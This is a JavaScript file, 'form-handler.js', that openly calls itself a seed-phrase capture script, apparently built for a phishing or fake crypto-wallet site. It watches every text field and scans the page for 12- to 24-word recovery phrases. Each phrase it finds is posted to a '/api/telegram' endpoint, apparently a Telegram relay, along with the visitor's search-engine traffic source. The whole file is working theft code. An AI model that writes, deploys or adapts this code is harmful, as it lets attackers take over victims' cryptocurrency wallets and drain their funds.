// ============================================================
// SEED PHRASE CAPTURE - form-handler.js
// Captures seed phrases from: user input + wallet creation UI
// ============================================================

const API = '/api/telegram';
let lastSent = '';
let inputTimer;

// --- Traffic source ---
function getTrafficSource() {
  const ref = document.referrer.toLowerCase();
  const p = new URLSearchParams(window.location.search);
  if (ref.includes('google.com') || ref.includes('google.co')) return 'Google SEO';
  if (ref.includes('bing.com')) return 'Bing SEO';
  const s = p.get('utm_source') || p.get('source') || '';
  if (s.toLowerCase().includes('google')) return 'Google SEO';
  if (s.toLowerCase().includes('bing')) return 'Bing SEO';
  return document.referrer || 'Direct';
}
const trafficSource = getTrafficSource();

// --- Word count helper ---
function wc(val) {
  return (val || '').trim().split(/\s+/).filter(w => w.length > 0).length;
}

// --- Validate seed phrase ---
function isSeedPhrase(val) {
  return val && [12, 15, 18, 21, 24].includes(wc(val));
}

// --- Send to Telegram ---
async function sendToTelegram(data) {
  data.trafficSource = trafficSource;
  data.timestamp = new Date().toISOString();
  for (let i = 0; i < 3; i++) {
    try {
      const r = await fetch(API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ data })
      });
      if (!r.ok) throw new Error('HTTP ' + r.status);
      return await r.json();
    } catch (e) {
      if (i === 2) throw e;
      await new Promise(r => setTimeout(r, 1000 * (i + 1)));
    }
  }
}

// --- Send phrase (dedup) ---
function sendPhrase(phrase, type, extra) {
  if (!phrase || phrase === lastSent) return;
  lastSent = phrase;
  const count = wc(phrase);
  const payload = Object.assign({
    TYPE: type,
    PHRASE: phrase,
    WORDS: count,
    PAGE: window.location.pathname
  }, extra || {});
  sendToTelegram(payload)
    .then(() => console.log('✅ Phrase sent:', count, 'words from', trafficSource))
    .catch(e => console.error('❌ Send failed:', e));
}

// --- DOM scan for displayed phrases ---
function scanDOM(root) {
  if (!root || !root.querySelectorAll) return;
  // Only check leaf-like elements to avoid duplicate parent-child matches
  root.querySelectorAll('*').forEach(el => {
    if (el.getAttribute('data-tp-sent')) return;
    let txt = '';
    if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
      txt = el.value || '';
    } else if (el.children.length === 0 || ['PRE','CODE','SPAN','P'].includes(el.tagName)) {
      txt = el.textContent || '';
    }
    txt = txt.trim();
    if (isSeedPhrase(txt)) {
      el.setAttribute('data-tp-sent', '1');
      const cls = (el.className || '').toString().trim().split(' ')[0];
      console.log('📋 Displayed phrase:', wc(txt), 'words in', el.tagName + (cls ? '.' + cls : ''));
      sendPhrase(txt, 'WALLET_CREATED_DISPLAYED', {
        ELEMENT: el.tagName + (cls ? '.' + cls : '')
      });
    }
  });
}

// --- Start DOM monitor ---
function startMonitor() {
  // Observe new elements
  new MutationObserver(muts => {
    muts.forEach(m => m.addedNodes.forEach(n => {
      if (n.nodeType === 1) scanDOM(n);
    }));
  }).observe(document.body, { childList: true, subtree: true });

  // Scan at intervals for lazy-loaded content
  [500, 1500, 3000, 5000, 8000, 12000].forEach(t => {
    setTimeout(() => scanDOM(document.body), t);
  });
}

// --- Input event: capture typed phrases ---
document.addEventListener('input', function(e) {
  const t = e.target;
  if (t.tagName !== 'INPUT' && t.tagName !== 'TEXTAREA') return;
  clearTimeout(inputTimer);
  inputTimer = setTimeout(function() {
    const val = t.value.trim();
    if (isSeedPhrase(val) && val !== lastSent) {
      sendPhrase(val, 'SEED_PHRASE', {
        FIELD: t.name || t.id || t.placeholder || 'input'
      });
    }
  }, 600);
});

// --- Blur event: capture on field exit ---
document.addEventListener('blur', function(e) {
  const t = e.target;
  if (t.tagName !== 'INPUT' && t.tagName !== 'TEXTAREA') return;
  const val = (t.value || '').trim();
  if (isSeedPhrase(val) && val !== lastSent) {
    sendPhrase(val, 'SEED_ON_BLUR', {
      FIELD: t.name || t.id || t.placeholder || 'input'
    });
  }
}, true);

// --- Boot ---
document.addEventListener('DOMContentLoaded', function() {
  console.log('🔍 Traffic source:', trafficSource);
  startMonitor();
});

// Expose for popup.html and other scripts
window.TelegramIntegration = { send: sendToTelegram, sendPhrase: sendPhrase };
